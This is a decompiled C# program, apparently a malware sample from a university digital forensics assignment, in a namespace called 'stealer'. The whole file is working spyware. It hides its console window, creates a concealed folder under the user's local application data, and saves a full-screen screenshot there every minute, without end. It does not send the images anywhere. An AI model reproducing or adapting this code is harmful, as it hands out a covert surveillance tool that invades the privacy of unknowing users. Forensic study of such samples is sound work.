// Decompiled with JetBrains decompiler
// Type: stealer.Program
// Assembly: picturesays, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7A6AB5F1-6786-4321-9962-D3ED13BD0059
// Assembly location: C:\Users\Nabeel\OneDrive\Academic\UoC\CO7606 - Digital Forensics and Incident Response\Assessment 2\Task 2\Malware\picturesays.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace stealer
{
internal class Program
{
	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static string secretDir { get; set; }

	private static void setup()
	{
	Program.secretDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
	Program.secretDir += "\\888";
	if (Directory.Exists(Program.secretDir))
		return;
	Directory.CreateDirectory(Program.secretDir);
	}

	private static void run()
	{
	while (true)
	{
		long fileTime = DateTime.Now.ToFileTime();
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
		{
		using (Graphics graphics = Graphics.FromImage((Image) bitmap))
			graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
		bitmap.Save(Program.secretDir + "\\" + fileTime.ToString() + ".jpg", ImageFormat.Jpeg);
		}
		Thread.Sleep(60000);
	}
	}

	private static void Main(string[] args)
	{
	Program.ShowWindow(Program.GetConsoleWindow(), 0);
	Program.setup();
	Program.run();
	}
}
}
